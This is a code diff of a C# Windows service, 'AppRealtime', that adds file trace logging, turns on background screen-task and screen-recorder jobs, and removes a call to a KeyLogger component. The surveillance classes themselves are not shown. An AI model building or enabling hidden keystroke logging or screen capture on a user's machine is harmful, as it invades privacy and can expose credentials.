@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.ServiceProcess;
 using System.Text;
@@ -18,6 +19,16 @@ namespace AppRealtime
         public AppRealtimeService()
         {
             InitializeComponent();
+
+            Trace.Listeners.Clear();
+            TextWriterTraceListener twtl = new TextWriterTraceListener("app.log");
+            twtl.Name = "TextLogger";
+            twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
+
+            Trace.Listeners.Add(twtl);
+
+            Trace.AutoFlush = true;
+
         }
 
         protected override void OnStart(string[] args)
@@ -35,17 +46,16 @@ namespace AppRealtime
             _screenTask = new ScreenTask();
             _screenTask.LoadSettings();
 
-            //Task.Run(() =>
-            //{
-            //    _ = _screenTask.StartTaskAsync();
-            //});
-            //Task.Run(async () =>
-            //{
-            //    _screenRecorder = new ScreenRecorder(_screenTask.CurrentSettings);
-            //    await _screenRecorder.RunAsync();
-            //});
+            Task.Run(() =>
+            {
+                _ = _screenTask.StartTaskAsync();
+            });
 
-            KeyLogger.Run();
+            Task.Run(async () =>
+            {
+                _screenRecorder = new ScreenRecorder(_screenTask.CurrentSettings);
+                await _screenRecorder.RunAsync();
+            });
         }
     }
 }
